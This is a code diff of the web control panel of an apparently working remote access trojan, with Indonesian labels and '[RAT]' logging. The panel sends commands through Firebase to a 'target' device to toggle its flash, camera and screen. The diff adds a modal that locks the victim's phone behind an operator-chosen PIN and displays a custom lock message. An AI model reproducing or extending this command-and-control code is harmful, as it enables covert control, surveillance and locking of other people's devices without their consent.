@@ -139,6 +139,85 @@
             text-align: center; font-size: 16px;
         }
         .btn-back:hover { background: #4a9eff; color: #fff; }
+
+        /* Modal Dialog */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .modal-overlay.active {
+            display: flex;
+        }
+        .modal-box {
+            background: #111a3a;
+            border-radius: 20px;
+            padding: 24px;
+            border: 1px solid #4a9eff;
+            max-width: 400px;
+            width: 100%;
+            box-shadow: 0 0 40px rgba(74, 158, 255, 0.4);
+        }
+        .modal-box h2 {
+            color: #4a9eff;
+            font-size: 20px;
+            margin-bottom: 16px;
+            text-align: center;
+        }
+        .modal-box label {
+            display: block;
+            color: #c0d0ff;
+            font-size: 14px;
+            margin-bottom: 6px;
+            margin-top: 14px;
+        }
+        .modal-box input {
+            width: 100%;
+            padding: 12px 14px;
+            background: #0a0e27;
+            border: 1px solid #2a4a8a;
+            border-radius: 10px;
+            color: #e0e8ff;
+            font-size: 15px;
+            box-sizing: border-box;
+            outline: none;
+        }
+        .modal-box input:focus {
+            border-color: #4a9eff;
+        }
+        .modal-box .btn-row {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        .modal-box .btn-cancel {
+            flex: 1;
+            padding: 12px;
+            background: transparent;
+            border: 2px solid #ff6b6b;
+            color: #ff6b6b;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
+        .modal-box .btn-confirm {
+            flex: 1;
+            padding: 12px;
+            background: linear-gradient(135deg, #4a9eff, #1a5bbf);
+            border: none;
+            color: #fff;
+            border-radius: 50px;
+            font-weight: bold;
+            cursor: pointer;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
@@ -205,6 +284,24 @@
         <button class="btn-back" onclick="history.back()">Kembali</button>
     </div>
 
+    <!-- MODAL DIALOG LOCK CUSTOM -->
+    <div class="modal-overlay" id="lockModal">
+        <div class="modal-box">
+            <h2>🔒 Lock Device</h2>
+
+            <label>PIN Unlock (4 digit)</label>
+            <input type="number" id="inputPin" maxlength="4" placeholder="Contoh: 1234">
+
+            <label>Pesan Lock</label>
+            <input type="text" id="inputMessage" maxlength="100" placeholder="Contoh: Jangan pakai HP ini!">
+
+            <div class="btn-row">
+                <button class="btn-cancel" onclick="closeLockModal()">BATAL</button>
+                <button class="btn-confirm" onclick="confirmLock()">KUNCI</button>
+            </div>
+        </div>
+    </div>
+
     <script type="module">
         import { db, ref, onValue, set } from './firebase-config.js';
 
@@ -212,7 +309,7 @@
         const urlParams = new URLSearchParams(window.location.search);
         const targetId = urlParams.get('target');
 
-        console.log('[RAT] Target ID dari URL:', targetId);
+        console.log('[RAT] Target ID:', targetId);
 
         if (!targetId) {
             alert('Target tidak ditemukan di URL! Kembali ke Device Target.');
@@ -232,7 +329,6 @@
             const deviceTweak = document.getElementById('deviceTweak');
 
             if (!target) {
-                console.log('[RAT] Target tidak ditemukan di Firebase');
                 statusBadge.classList.add('offline');
                 statusText.textContent = 'OFFLINE';
                 deviceName.textContent = 'Target tidak ditemukan';
@@ -242,7 +338,6 @@
                 return;
             }
 
-            // Cek timestamp (30 detik)
             const now = Date.now();
             const diff = target.timestamp ? (now - target.timestamp) : 999999;
             const isOnline = diff < 30000 && target.status === 'online';
@@ -251,11 +346,9 @@
             if (isOnline) {
                 statusBadge.classList.remove('offline');
                 statusText.textContent = 'ONLINE';
-                console.log('[RAT] Target ONLINE');
             } else {
                 statusBadge.classList.add('offline');
                 statusText.textContent = 'OFFLINE';
-                console.log('[RAT] Target OFFLINE. diff =', diff);
             }
 
             deviceName.textContent = target.name || 'Perangkat Target';
@@ -268,20 +361,9 @@
                 deviceTweak.style.display = 'none';
             }
 
-            // Enable/disable switches
             document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
                 cb.disabled = !isOnline;
             });
-
-            if (!isOnline) {
-                document.querySelectorAll('.control-box input[type="checkbox"]').forEach(cb => {
-                    cb.checked = false;
-                });
-                document.querySelectorAll('.control-box .label span').forEach(el => {
-                    el.textContent = 'OFF';
-                    el.className = '';
-                });
-            }
         });
 
         function disableAllSwitches() {
@@ -301,16 +383,14 @@
                 alert('❌ Target offline! Tunggu sampai online.');
                 return;
             }
-
-            console.log('[RAT] Mengirim command:', command);
+            console.log('[RAT] Kirim command:', command);
             set(ref(db, 'targets/' + targetId + '/command'), command)
                 .then(() => {
-                    console.log('[RAT] ✅ Command berhasil dikirim:', command);
+                    console.log('[RAT] ✅ Berhasil:', command);
                     document.getElementById('lastCommand').textContent = command;
                 })
                 .catch((error) => {
-                    console.error('[RAT] ❌ Gagal kirim command:', error);
-                    alert('Gagal kirim perintah: ' + error.message);
+                    alert('Gagal kirim: ' + error.message);
                 });
         }
 
@@ -327,7 +407,47 @@
             }
         }
 
-        // ===== PASANG LISTENER KE SEMUA SWITCH =====
+        // ===== MODAL LOCK =====
+        const lockModal = document.getElementById('lockModal');
+        const inputPin = document.getElementById('inputPin');
+        const inputMessage = document.getElementById('inputMessage');
+        const lockCheckbox = document.getElementById('lock');
+
+        function openLockModal() {
+            inputPin.value = '1234';
+            inputMessage.value = 'Perangkat ini terkunci oleh administrator.';
+            lockModal.classList.add('active');
+        }
+
+        window.closeLockModal = function() {
+            lockModal.classList.remove('active');
+            // Reset switch karena user batal
+            lockCheckbox.checked = false;
+            updateStatus('lock', 'lockStatus');
+        }
+
+        window.confirmLock = function() {
+            const pin = inputPin.value.trim();
+            const message = inputMessage.value.trim();
+
+            if (!/^\d{4}$/.test(pin)) {
+                alert('❌ PIN harus 4 digit angka!');
+                return;
+            }
+
+            if (message === '') {
+                alert('❌ Pesan tidak boleh kosong!');
+                return;
+            }
+
+            const cmd = "LOCK_CUSTOM|" + pin + "|" + message;
+            sendCommand(cmd);
+
+            lockModal.classList.remove('active');
+            updateStatus('lock', 'lockStatus');
+        }
+
+        // ===== PASANG LISTENER SWITCH =====
         const controls = [
             { checkbox: 'flash', status: 'flashStatus', command: 'FLASH' },
             { checkbox: 'lock', status: 'lockStatus', command: 'LOCK' },
@@ -337,17 +457,27 @@
 
         controls.forEach(function(item) {
             const checkboxEl = document.getElementById(item.checkbox);
-            const statusEl = document.getElementById(item.status);
 
             checkboxEl.addEventListener('change', function() {
-                console.log('[RAT] Switch ' + item.checkbox + ' berubah ke:', this.checked);
+                console.log('[RAT] Switch ' + item.checkbox + ':', this.checked);
 
-                const cmd = item.command + (this.checked ? '_ON' : '_OFF');
-                sendCommand(cmd);
-                updateStatus(item.checkbox, item.status);
+                if (item.command === 'LOCK') {
+                    // Khusus LOCK
+                    if (this.checked) {
+                        openLockModal();
+                    } else {
+                        // Unlock
+                        sendCommand('LOCK_OFF');
+                        updateStatus('lock', 'lockStatus');
+                    }
+                } else {
+                    // Fitur lain (Flash, Camera, Screen)
+                    const cmd = item.command + (this.checked ? '_ON' : '_OFF');
+                    sendCommand(cmd);
+                    updateStatus(item.checkbox, item.status);
+                }
             });
 
-            // Set status awal
             updateStatus(item.checkbox, item.status);
         });
 
